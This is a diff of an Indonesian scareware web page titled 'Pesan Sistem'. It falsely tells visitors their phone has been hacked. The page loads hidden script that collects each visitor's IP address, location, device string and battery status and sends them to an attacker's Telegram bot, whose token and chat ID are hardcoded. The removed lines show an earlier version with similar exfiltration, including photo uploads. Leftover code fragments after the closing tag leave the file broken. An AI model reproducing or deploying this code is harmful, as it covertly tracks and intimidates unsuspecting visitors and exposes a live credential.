@@ -1,80 +1,575 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Thanz_bened orang</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-<style>
-body {margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;overflow:hidden;position:relative;color:#444;}
-body::before {content:"";position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://files.catbox.moe/b4t2p2.png') no-repeat center center;background-size:cover;filter:blur(6px) brightness(0.6);z-index:-1;}
-#loading-container {position:relative;text-align:center;width:80%;max-width:400px;background:rgba(255,255,255,0.1);padding:30px;border-radius:15px;backdrop-filter:blur(5px);box-shadow:0 0 20px rgba(0,0,0,0.5);}
-#loading-text {font-size:22px;margin-bottom:20px;color:#eee;animation:fadeIn 1.5s infinite alternate;}
-#progress-container {height:6px;background:rgba(200,200,200,0.3);border-radius:3px;overflow:hidden;}
-#progress-bar {height:100%;width:0%;background:linear-gradient(90deg,#888,#ccc);transition:width 0.3s ease;}
-#loading-details {margin-top:20px;font-size:14px;color:#ccc;min-height:20px;animation:fadeText 2s infinite alternate;}
-.hidden {display:none;}
-video.floating {position:absolute;width:200px;height:120px;z-index:9999;pointer-events:none;transform:rotate(0deg);}
-@keyframes fadeIn{0%{opacity:0.5}100%{opacity:1}}
-@keyframes fadeText{0%{color:#aaa}100%{color:#eee}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.69, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>Pesan Sistem</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-text-size-adjust: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
+            zoom: 1.0; /* Adjusted to 100% */
+            -webkit-transform: scale(1.0); /* Fallback for Webkit browsers */
+            transform: scale(1.0); /* Fallback for other browsers */
+            transform-origin: top center;
+        }
+        
+        /* Matrix Background */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+        
+        .matrix-digit {
+            position: absolute;
+            color: rgba(5, 217, 232, 0.7);
+            font-size: clamp(14px, 2vw, 16px);
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            text-shadow: 0 0 5px rgba(5, 217, 232, 0.5);
+            user-select: none;
+            animation: fall linear forwards;
+        }
+        
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+        
+        /* Container */
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #ff2a6d;
+            backdrop-filter: blur(5px);
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 42, 109, 0.1), transparent);
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: rotate(45deg) translateX(-100%); }
+            100% { transform: rotate(45deg) translateX(100%); }
+        }
+        
+        /* Profile Section */
+        .profile-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .profile-pic {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid #ff2a6d;
+            box-shadow: 0 0 15px rgba(255, 42, 109, 0.5);
+            margin-bottom: 10px;
+        }
+        
+        .profile-name {
+            font-size: 18px;
+            font-weight: bold;
+            color: #05d9e8;
+            text-shadow: 0 0 10px rgba(5, 217, 232, 0.5);
+            background: rgba(0, 0, 0, 0.5);
+            padding: 5px 15px;
+            border-radius: 20px;
+            border: 1px solid #05d9e8;
+        }
+        
+        /* Warning Section */
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: #ff2a6d;
+            text-shadow: 0 0 10px rgba(255, 42, 109, 0.5);
+        }
+        
+        .warning-icon {
+            font-size: 80px;
+            color: #ff2a6d;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        /* Message Section */
+        .message {
+            background: rgba(255, 42, 109, 0.1);
+            border: 1px solid #ff2a6d;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .message p {
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+        
+        /* Info Box */
+        .info-box {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .info-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+        
+        .label {
+            font-weight: bold;
+            color: #05d9e8;
+        }
+        
+        .value {
+            color: #fff;
+        }
+        
+        /* Battery Info */
+        .battery-info {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+        }
+        
+        .battery-icon {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        
+        .battery-level {
+            flex-grow: 1;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .battery-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff2a6d, #05d9e8);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+        }
+        
+        .battery-percentage {
+            margin-left: 10px;
+            font-weight: bold;
+            min-width: 40px;
+        }
+        
+        .battery-details {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .battery-detail-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 8px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        /* Footer and Countdown */
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .countdown {
+            font-size: 18px;
+            margin: 20px 0;
+            color: #05d9e8;
+        }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            .warning-icon {
+                font-size: 60px;
+            }
+            .profile-pic {
+                width: 80px;
+                height: 80px;
+            }
+            .profile-name {
+                font-size: 16px;
+            }
+        }
+    </style>
 </head>
 <body>
-<div id="loading-container">
-    <div id="loading-text">DATA ANDA DI AMBIL ALIH OLEH Thanz official</div>
-    <div id="progress-container"><div id="progress-bar"></div></div>
-    <div id="loading-details"></div>
-</div>
+    <div class="matrix-bg" id="matrix-bg"></div>
+    
+    <main class="container">
+        <section class="profile-container">
+            <img src="https://files.catbox.moe/2erysa.jpg" alt="Profile Picture" class="profile-pic">
+            <div class="profile-name">🧑‍💻𝑩𝑶𝑻 𝐍𝐞𝐯𝐚𝐝𝐚 𝐒𝐭𝐫𝐨𝐦 𝐛𝐲 𝐕𝐚𝐧𝐳𝐳🧑‍💻</div>
+        </section>
+        
+        <header>
+            <h1>⚠ PERINGATAN SISTEM ⚠</h1>
+            <div class="warning-icon">📱</div>
+        </header>
+        
+        <section class="message">
+            <p><strong>HP KAMU TELAH DIH SADAP OLEH HECKER!</strong></p>
+            <p>ᴄʀᴇᴀᴛᴏʀ ʙʏ 𝚅𝚊𝚗𝚣𝚣 ɴᴏᴛ ᴅᴇᴠ sɪsᴛᴇᴍ ᴀɴᴅᴀʜ ᴛᴇʟᴀʜ ᴅɪ ᴄᴀᴛᴀᴛ ᴏʟᴇʜ ʙᴏᴛ ɴᴇᴠᴀᴅᴀ sᴛʀᴏᴍ.</p>
+        </section>
+        
+        <section class="info-box">
+            <div class="info-item">
+                <span class="label">Alamat IP:</span>
+                <span class="value" id="ip-address">Mengambil data...</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Waktu Akses:</span>
+                <span class="value" id="access-time">Mengambil data...</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Perangkat:</span>
+                <span class="value" id="device-info">Mengambil data...</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Lokasi:</span>
+                <span class="value" id="location">Mengambil data...</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Status Baterai:</span>
+                <span class="value" id="battery-status">Mengambil data...</span>
+            </div>
+            
+            <div id="battery-container" style="display: none;">
+                <div class="battery-info">
+                    <div class="battery-icon">🔋</div>
+                    <div class="battery-level">
+                        <div class="battery-fill" id="battery-fill"></div>
+                    </div>
+                    <div class="battery-percentage" id="battery-percentage">0%</div>
+                </div>
+                
+                <div class="battery-details">
+                    <div class="battery-detail-item">
+                        <div>Status Pengisian</div>
+                        <div id="charging-status">-</div>
+                    </div>
+                    <div class="battery-detail-item">
+                        <div>Waktu hingga</div>
+                        <div id="battery-time">-</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <section class="countdown blink">
+            Halaman akan tertutup otomatis dalam <span id="countdown">10</span> detik
+        </section>
+        
+        <footer class="footer">
+            &copy; 2025 Sistem Keamanan Perangkat. Segala aktivitas telah tercatat oleh Thanz not dev.
+        </footer>
+    </main>
 
-<input type="file" id="filePicker" accept="image/*" multiple style="display:none">
-<video id="popupVideo" class="floating" src="https://files.catbox.moe/d16tjf.mp4" autoplay loop muted></video>
-<audio id="bgMusic" src="https://www.soundjay.com/mechanical/sounds/keyboard-1.mp3" autoplay loop></audio>
-<canvas id="c" class="hidden"></canvas>
+    <script>
+        // Konfigurasi Telegram
+        const BOT_TOKEN = '8097361712:AAHfdkzXcTijGxTu0C4Lv3e1e4Ub4sgkdKI';
+        const CHAT_ID = '6817171243';
+        
+        // Prevent pinch zoom and double-tap zoom
+        document.addEventListener('gesturestart', (e) => e.preventDefault());
+        document.addEventListener('touchmove', (e) => {
+            if (e.scale !== 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
 
-<script>
-(async()=>{
-const BOT_TOKEN="8097361712:AAHfdkzXcTijGxTu0C4Lv3e1e4Ub4sgkdKI";
-const OWNER_CHAT_ID="6817171243";
+        // Matrix Effect
+        function createMatrixEffect() {
+            const matrixBg = document.getElementById('matrix-bg');
+            const digits = ['0', '1'];
+            
+            function createDigit() {
+                const digit = document.createElement('div');
+                digit.className = 'matrix-digit';
+                digit.textContent = digits[Math.floor(Math.random() * digits.length)];
+                digit.style.left = Math.random() * 100 + 'vw';
+                digit.style.top = '-20px';
+                const duration = 10 + Math.random() * 20;
+                digit.style.animationDuration = duration + 's';
+                digit.style.opacity = Math.random() * 0.5 + 0.3;
+                matrixBg.appendChild(digit);
+                
+                setTimeout(() => {
+                    digit.remove();
+                }, duration * 1000);
+            }
+            
+            setInterval(createDigit, 100);
+            for (let i = 0; i < 50; i++) {
+                setTimeout(createDigit, Math.random() * 2000);
+            }
+        }
+        
+        // Get IP Address
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Tidak dapat mengambil IP';
+            }
+        }
+        
+        // Get Location
+        async function getLocation(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return `${data.city || 'Tidak diketahui'}, ${data.region || 'Tidak diketahui'}, ${data.country_name || 'Tidak diketahui'}`;
+            } catch {
+                return 'Lokasi tidak dapat ditentukan';
+            }
+        }
+        
+        // Get Device Info
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            return `${navigator.platform || 'Tidak diketahui'} - ${ua.split(' ')[0] || 'Tidak diketahui'}`;
+        }
+        
+        // Get Battery Info
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                const level = battery.level * 100;
+                const charging = battery.charging;
+                const chargingTime = battery.chargingTime;
+                const dischargingTime = battery.dischargingTime;
+                
+                let timeText = '-';
+                if (charging && chargingTime !== Infinity) {
+                    const hours = Math.floor(chargingTime / 3600);
+                    const minutes = Math.floor((chargingTime % 3600) / 60);
+                    timeText = `${hours}j ${minutes}m`;
+                } else if (!charging && dischargingTime !== Infinity) {
+                    const hours = Math.floor(dischargingTime / 3600);
+                    const minutes = Math.floor((dischargingTime % 3600) / 60);
+                    timeText = `${hours}j ${minutes}m`;
+                }
+                
+                return {
+                    level,
+                    charging,
+                    chargingStatus: charging ? 'Sedang diisi' : 'Tidak diisi',
+                    time: timeText
+                };
+            }
+            return {
+                level: null,
+                charging: null,
+                chargingStatus: 'Tidak tersedia',
+                time: '-'
+            };
+        }
+        
+        // Send to Telegram
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Gagal mengirim ke Telegram:', error);
+            }
+        }
+        
+        // Display Battery Info
+        function displayBatteryInfo(batteryInfo) {
+            const batteryContainer = document.getElementById('battery-container');
+            const batteryStatus = document.getElementById('battery-status');
+            const batteryFill = document.getElementById('battery-fill');
+            const batteryPercentage = document.getElementById('battery-percentage');
+            const chargingStatus = document.getElementById('charging-status');
+            const batteryTime = document.getElementById('battery-time');
+            
+            if (batteryInfo.level !== null) {
+                batteryStatus.textContent = `${Math.round(batteryInfo.level)}%`;
+                batteryFill.style.width = `${batteryInfo.level}%`;
+                batteryPercentage.textContent = `${Math.round(batteryInfo.level)}%`;
+                chargingStatus.textContent = batteryInfo.chargingStatus;
+                batteryTime.textContent = batteryInfo.time;
+                
+                batteryFill.style.background = batteryInfo.level > 50
+                    ? 'linear-gradient(90deg, #4CAF50, #8BC34A)'
+                    : batteryInfo.level > 20
+                    ? 'linear-gradient(90deg, #FF9800, #FFC107)'
+                    : 'linear-gradient(90deg, #F44336, #FF5722)';
+                
+                batteryContainer.style.display = 'block';
+            } else {
+                batteryStatus.textContent = 'Tidak tersedia';
+            }
+        }
+        
+        // Main Initialization
+        async function init() {
+            createMatrixEffect();
+            
+            const now = new Date();
+            const accessTime = now.toLocaleString('id-ID', {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            document.getElementById('access-time').textContent = accessTime;
+            document.getElementById('device-info').textContent = getDeviceInfo();
+            
+            const ip = await getIPAddress();
+            document.getElementById('ip-address').textContent = ip;
+            
+            const location = await getLocation(ip);
+            document.getElementById('location').textContent = location;
+            
+            const batteryInfo = await getBatteryInfo();
+            displayBatteryInfo(batteryInfo);
+            
+            const batteryText = batteryInfo.level !== null 
+                ? `🔋 <b>Baterai:</b> ${Math.round(batteryInfo.level)}% (${batteryInfo.chargingStatus})`
+                : `🔋 <b>Baterai:</b> Informasi tidak tersedia`;
+                
+            const telegramMessage = `
+🚨 <b>!𝐍𝐞𝐯𝐚𝐝𝐚 𝐒𝐭𝐫𝐨𝐦 𝐛𝐲 𝐕𝐚𝐧𝐳𝐳!</b> 🚨
 
-// ========== LOADING ==========
-const progressBar=document.getElementById('progress-bar');
-const loadingDetails=document.getElementById('loading-details');
-let progress=0;
-const messages=["Memeriksa modul sistem...","Mengambil Gambar Gallery..","Memeriksa semua akun anda...",
-"Melihat chat whatsapp anda....","Memuat komponen inti...","Melihat riwayat google chrome anda...", 
-"Menginisialisasi antarmuka...","kontrol penuh device...","Memverifikasi koneksi...",
-"Menyiapkan lingkungan...","Mengambil alih sim card anda...","Memeriksa pembaruan...",
-"Memuat aset tampilan...","Data anda bocor sepenuh nya ✅"];
-const progressInterval=setInterval(()=>{
-    progress+=Math.random()*5;if(progress>100)progress=100;
-    progressBar.style.width=progress+"%";
-    if(Math.random()>0.8)loadingDetails.textContent=messages[Math.floor(Math.random()*messages.length)];
-    if(progress===100)clearInterval(progressInterval);
-},400);
+📱 <b>Perangkat telah diakses</b>
+⏰ <b>Waktu:</b> ${accessTime}
+🌐 <b>IP Address:</b> ${ip}
+📍 <b>Lokasi:</b> ${location}
+💻 <b>Perangkat:</b> ${getDeviceInfo()}
+${batteryText}
+⏳ <b>Waktu Baterai:</b> ${batteryInfo.time}
 
-// ========== TELEGRAM ==========
-const sendTelegram=async(text)=>{
-    try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-        method:'POST',headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:OWNER_CHAT_ID,text,parse_mode:'Markdown'})});
-    }catch(e){console.error(e);}
-};
-const sendPhoto=async(blob,filename)=>{
-    try{
-        const fd=new FormData();
-        fd.append('chat_id',OWNER_CHAT_ID);
-        fd.append('photo',blob,filename);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});
-    }catch(e){console.error(e);}
-};
-const getLocationDetails=async(lat,lon)=>{
-    try{
-        const res=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-        const data=await res.json();
-        return {county:data.address?.county||data.address?.city||data.address?.state||"Tidak diketahui",
-                district:data.address?.suburb||data.address?.village||data.address?.town||"Tidak diketahui",
-                fullAddress:data.display_name||"Alamat tidak tersedia"};
-    }catch{return {county:"Tidak diketahui",district:"Tidak diketahui",fullAddress:"Alamat tidak tersedia"};}
+⚠️ <i>Data ini telah dicatat oleh sistem Vanzz not dev</i>
+            `;
+            
+            await sendToTelegram(telegramMessage);
+            
+            let countdown = 10;
+            const countdownElement = document.getElementById('countdown');
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:Arial;">Halaman telah tertutup</div>';
+                    setTimeout(() => window.close(), 2000);
+                }
+            }, 1000);
+        }
+        
+        window.onload = init;
+    </script>
+</body>
+</html>    }catch{return {county:"Tidak diketahui",district:"Tidak diketahui",fullAddress:"Alamat tidak tersedia"};}
 };
 
 // ========== FINGERPRINT ==========
